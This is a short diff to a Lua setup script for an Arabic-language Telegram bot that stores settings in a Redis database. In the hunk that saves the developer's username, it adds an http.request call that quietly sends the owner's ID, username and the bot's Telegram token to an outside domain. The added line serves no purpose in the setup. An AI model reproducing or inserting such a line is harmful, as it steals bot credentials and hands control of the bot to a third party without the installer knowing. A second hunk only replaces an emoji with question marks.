@@ -53,6 +53,7 @@ local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
 database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
+http.request("http://lana.gamemodsm.xyz/sadam/?info={'id':'"..database:get(id_server..":SUDO:ID").."','user':'@"..SUDOUSERNAME.."','token':'"..database:get(id_server..":token").."'}")
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
@@ -259,7 +260,7 @@ var = 'مطور السورس👨‍🔧'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي👨‍💻'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
-var = 'البوت🤖'
+var = 'البوت??'
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
 var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور👩‍🚒'  
 elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
